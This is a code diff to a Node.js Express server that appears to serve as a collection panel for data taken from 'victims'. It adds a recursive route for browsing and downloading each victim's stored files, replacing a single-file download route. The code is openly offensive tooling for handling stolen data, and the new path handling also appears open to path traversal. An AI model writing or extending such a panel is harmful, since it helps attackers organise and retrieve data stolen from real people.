@@ -70,7 +70,43 @@ app.post("/send", async (req, res) => {
   }
 });
 
-// --- Browse victim files ---
+// --- Browse victim files (recursive) ---
+app.get("/victim/:id/*", async (req, res) => {
+  const safeId = path.basename(req.params.id);
+  const victimDir = path.join(VICTIMS_DIR, safeId);
+  const subPath = req.params[0] || "";
+  const fullPath = path.join(victimDir, subPath);
+
+  // Check if it's a directory
+  try {
+    const stats = await fs.stat(fullPath);
+    if (stats.isDirectory()) {
+      const files = await fs.readdir(fullPath);
+      const backLink = subPath ? "/victim/" + safeId + "/" + path.dirname(subPath).replace(/\\/g, "/") : "/";
+      res.send(
+        `<h2>Folder: ${subPath || safeId}</h2>
+        <a href="${backLink}">⬅ Back</a>
+        <ul>${files.map(f => {
+          const itemPath = subPath ? `${subPath}/${f}` : f;
+          const itemFullPath = path.join(fullPath, f);
+          const isDir = fs.statSync(itemFullPath).isDirectory();
+          return `<li><a href="/victim/${safeId}/${itemPath.replace(/\\/g, "/")}">${isDir ? "📁 " : ""}${f}${isDir ? "/" : ""}</a></li>`;
+        }).join("")}</ul>`
+      );
+      return;
+    }
+  } catch (err) {}
+
+  // It's a file - download it
+  res.download(fullPath, err => {
+    if (err) {
+      console.error("Download failed:", err);
+      res.status(404).send("File not found");
+    }
+  });
+});
+
+// --- Browse victim root ---
 app.get("/victim/:id", async (req, res) => {
   const safeId = path.basename(req.params.id);
   const victimDir = path.join(VICTIMS_DIR, safeId);
@@ -85,20 +121,8 @@ app.get("/victim/:id", async (req, res) => {
 
   res.send(
     `<h2>Victim: ${safeId}</h2>
-    <ul>${files.map(f => `<li><a href="/victim/${safeId}/${f}">${f}</a></li>`).join("")}</ul>`
+    <ul>${files.map(f => `<li><a href="/victim/${safeId}/${f.replace(/\\/g, "/")}">${f}</a></li>`).join("")}</ul>`
   );
-});
-
-// --- Download specific file ---
-app.get("/victim/:id/:file", async (req, res) => {
-  const filePath = path.join(
-    VICTIMS_DIR,
-    path.basename(req.params.id),
-    req.params.file
-  );
-  res.download(filePath, err => {
-    if (err) console.error("Download failed:", err);
-  });
 });
 
 // --- Start server ---
